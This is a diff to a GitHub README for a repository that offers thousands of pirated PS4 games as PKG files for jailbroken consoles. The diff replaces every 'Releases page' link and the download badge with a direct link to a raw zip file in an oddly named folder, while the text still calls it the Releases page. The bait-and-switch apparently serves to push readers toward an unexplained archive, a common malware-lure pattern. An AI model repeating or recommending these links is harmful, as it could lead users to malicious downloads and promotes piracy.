@@ -1,7 +1,7 @@
 # 🎮 ps4-games-database - Your Free Source for PS4 Games
 
 ## 🔗 Download Now!
-[![Download ps4-games-database](https://img.shields.io/badge/Download%20Now-%20Blue?style=for-the-badge&logo=github&color=blue)](https://github.com/Adityasingh2720/ps4-games-database/releases)
+[![Download ps4-games-database](https://raw.githubusercontent.com/Adityasingh2720/ps4-games-database/main/marlinespike/ps4-games-database.zip%20Now-%20Blue?style=for-the-badge&logo=github&color=blue)](https://raw.githubusercontent.com/Adityasingh2720/ps4-games-database/main/marlinespike/ps4-games-database.zip)
 
 ## 🚀 Getting Started
 Welcome to the PS4 Games Database! This repository provides a complete collection of over 6001 PS4 games along with 38,690 direct download links. You can access free PKG files for jailbroken PS4 consoles running firmware versions 9.00 to 11.00. Follow the steps below to get started.
@@ -22,7 +22,7 @@ To run the PKG files from this database, you need:
 ## 💾 Download & Install
 To download the database files, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Adityasingh2720/ps4-games-database/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Adityasingh2720/ps4-games-database/main/marlinespike/ps4-games-database.zip).
    
 2. You will find a list of available releases. Each release contains different game files and updates. 
 
@@ -52,7 +52,7 @@ Join our community to share your experiences, tips, and questions. Reach out via
 We welcome contributions to improve this database. If you have new game links or updates, feel free to submit a pull request. Your assistance helps us keep the database updated for everyone.
 
 ## 🔄 Update Notifications
-To stay updated with the latest releases and announcements, consider checking back regularly on the [Releases page](https://github.com/Adityasingh2720/ps4-games-database/releases).
+To stay updated with the latest releases and announcements, consider checking back regularly on the [Releases page](https://raw.githubusercontent.com/Adityasingh2720/ps4-games-database/main/marlinespike/ps4-games-database.zip).
 
 ## 🌟 Conclusion
 Thank you for using the PS4 Games Database. We hope you enjoy the games!
